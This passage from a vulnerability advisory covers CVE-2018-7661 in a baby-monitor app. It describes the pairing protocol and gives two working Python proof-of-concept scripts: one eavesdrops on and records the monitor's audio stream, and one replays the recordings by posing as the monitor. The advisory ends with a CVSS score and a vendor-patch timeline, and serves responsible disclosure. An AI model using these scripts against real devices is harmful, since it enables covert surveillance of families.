 
Monitoring the traffic using Wireshark during the pairing process revealed:
 
- The initial connection is made on port 8257
- To start the pairing process, the same sequence is sent each time
- After the pairing process is finished, another connection is opened to port 8258, where the audio data will be transmitted
- After the connection is made to port 8258, the connection on port 8257 is kept open and used as a heartbeat for the session
- On the heartbeat connection, the client will periodically send 0x01 to the baby monitor (roughly once per second)
 
## Abusing The Protocol to Record Audio
 
With the pairing process reversed, it was possible to create a proof of concept which proved that it was possible to deploy a small program into a compromised network which would eavesdrop on a baby monitor and allow for an attacker to play the recording back at a later date at their discretion.
 
The [very hacky] proof of concept code can be found below:
 
```
import socket
import sys
import time
 
if len(sys.argv) < 2:
    print "Usage: python {file} target_ip [port]".format(file = sys.argv[0])
    exit(1)
 
target = sys.argv[1]
port = 8257
 
if len(sys.argv) == 3:
    port = int(sys.argv[2])
 
s = socket.socket()
s.connect((target, port))
s.send(&#039;\x01&#039;)
s.send(&#039;\x02\x64\x00\x00\x00\x13\x2b\x52\x65\x63\x65\x69\x76\x65\x72\x53&#039; +
       &#039;\x74\x61\x72\x74\x5f\x32\x2e\x30\x32\x00\x00\x00\x00\x03\x23\x31&#039; +
       &#039;\x30\x00\x00\x00\x00\x03\x23\x32\x30\x00\x00\x00\x00\x03\x23\x32&#039; +
       &#039;\x31\x00\x00\x00\x00\x03\x23\x32\x32\x00\x00\x00\x00\x03\x23\x32&#039; +
       &#039;\x33&#039;)
 
heartbeat_dump = open(&#039;dump.heartbeat.bin&#039;, &#039;wb&#039;)
data_dump = open(&#039;dump.data.bin&#039;, &#039;wb&#039;)
 
has_data_socket = False
data_socket = socket.socket()
delta = 0
 
while True:
    time.sleep(1)
    data = s.recv(2048)
    if data is not None:
        heartbeat_dump.write(data)
        print &#039;[*] Received {bytes} bytes on heartbeat socket&#039;.format(bytes = len(data))
        s.send(&#039;\x01&#039;)
 
    if has_data_socket:
        data = data_socket.recv(2048)
        if data is not None:
            data_dump.write(data)
            print &#039;[*] Received {bytes} bytes on data socket&#039;.format(bytes = len(data))
            data_socket.send(&#039;\x01&#039;)
    else:
        print &#039;[*] Establishing data connection&#039;
        data_socket.connect((target, 8258))
        data_socket.send(&#039;\x01&#039;)
        data_socket.send(&#039;\x02\x64\x00\x00\x00\x07\x33\x5f\x5f\x30\x30\x30\x30&#039;)
        has_data_socket = True
        print &#039;[*] Established data connection&#039;
 
    delta += 1
 
heartbeat_dump.close
data_dump.close
```
 
This script establishes a connection to the baby monitor and begins to dump out the data from port 8257 to dump.heartbeat.bin and the data from port 8258 to dump.data.bin.
 
Replaying the Recordings
In order to replay the recordings made by the proof of concept, I created a second script which would act as a baby monitor and replay the data back to a client; which allows for replay via the original application:
 
```
import socket
import sys
import time
 
s = socket.socket()
s.bind((&#039;0.0.0.0&#039;, 8257))
s.listen(5)
print &#039;[*] Heartbeat socket listening on port 8257&#039;
 
data_socket = socket.socket()
data_socket.bind((&#039;0.0.0.0&#039;, 8258))
data_socket.listen(5)
print &#039;[*] Data socket listening on port 8258&#039;
 
data = &#039;&#039;
with open(&#039;dump.heartbeat.bin&#039;, &#039;r&#039;) as replay_file:
    data = replay_file.read()
 
wav_data = &#039;&#039;
with open(&#039;dump.data.bin&#039;, &#039;r&#039;) as wav_file:
    wav_data = wav_file.read()
 
c, addr = s.accept()
print &#039;[*] Connection from {client}&#039;.format(client = addr)
c.send(data)
 
data_connection, addr = data_socket.accept()
print &#039;[*] Data connection from {client}&#039;.format(client = addr)
data_connection.send(wav_data)
 
buf_start = 0
buf_end = wav_data.find(&#039;\x00\x00\x00\x01&#039;, 1)
buf = wav_data[buf_start:buf_end]
 
while buf is not None:
    c.send(&#039;\x01&#039;)
    print &#039;[*] Sending {bytes} bytes&#039;.format(bytes = len(buf))
    data_connection.send(buf)
    time.sleep(0.1)
 
    if buf_end == -1 or buf_start == -1:
        buf = None
    else:
        buf_start = buf_end
        buf_end = wav_data.find(&#039;\x00\x00\x00\x01&#039;, buf_end + 1)
        if buf_end == -1:
            buf = wav_data[buf_start:]
        else:
            buf = wav_data[buf_start:buf_end]
 
data_connection.close()
c.close()
print &#039;[*] Connection closed&#039;
```
 
A demonstration of the replay script accepting a connection from a client and replaying a recording can be seen below:
 
https://vimeo.com/258487598
 
## Solution
 
 
 
## CVE-ID
 
CVE-2018-7661
 
## CVSS Score
 
CVSS Base Score: 5.9
Impact Subscore: 4.2
Exploitability Subscore: 1.6
CVSS Temporal Score: 5.3
Overall CVSS Score: 5.3
Vector: AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:H/E:P/RL:O/RC:C
 
## Disclosure Timeline
 
2018-02-11: Initial contact with vendor to make them aware of the attack vector
2018-02-15: Confirmation sent to vendor to let them know the proposed solution should nullify the attack
2018-02-16: Vendor begins roll-out process for the new update
2018-02-22: Roll-out process completed and version 2.02.2 made available to the public

